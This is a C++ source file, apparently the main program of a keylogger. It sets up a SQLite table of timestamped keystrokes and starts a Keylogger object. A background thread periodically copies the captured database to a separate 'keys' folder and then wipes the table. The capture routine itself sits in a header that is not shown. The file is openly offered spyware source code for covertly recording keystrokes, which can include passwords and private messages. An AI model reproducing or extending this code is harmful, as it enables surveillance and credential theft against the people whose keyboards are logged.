#include "keylogger.h"

#include <ctime>
#include <iostream>
#include <thread>
#include <fstream>
#include <iterator>

Database db;

bool copy_file(const char* From, const char* To, std::size_t MaxBufferSize = 1048576)
{
    std::ifstream is(From, std::ios_base::binary);
    std::ofstream os(To, std::ios_base::binary);

    std::pair<char*, std::ptrdiff_t> buffer;
    buffer = std::get_temporary_buffer<char>(MaxBufferSize);

    while (is.good() and os)
    {
        is.read(buffer.first, buffer.second);
        os.write(buffer.first, is.gcount());
    }

    std::return_temporary_buffer(buffer.first);

    if (os.fail()) return false;
    if (is.eof()) return true;
    return false;
}

void sendDb(time_t seconds)
{
	for (;;)
	{
		std::this_thread::sleep_for(std::chrono::seconds(seconds));

		copy_file("keylogger.sqlite3", "../../keys/keyboard.sqlite3");

		db.clear("keyboard");
	}
}

int main(int argc, char** argv) 
{
	int time;
	std::ifstream config("../../config.txt");
	config >> time;

	std::thread t(sendDb, time);
	
	db.createDatabase("keylogger.sqlite3");
	std::string cols[2] = { "time, key" };
	db.createTable("keyboard", 2, cols);
	db.clear("keyboard");

	Keylogger keylogger;
	keylogger.start(db);

	return 0;
}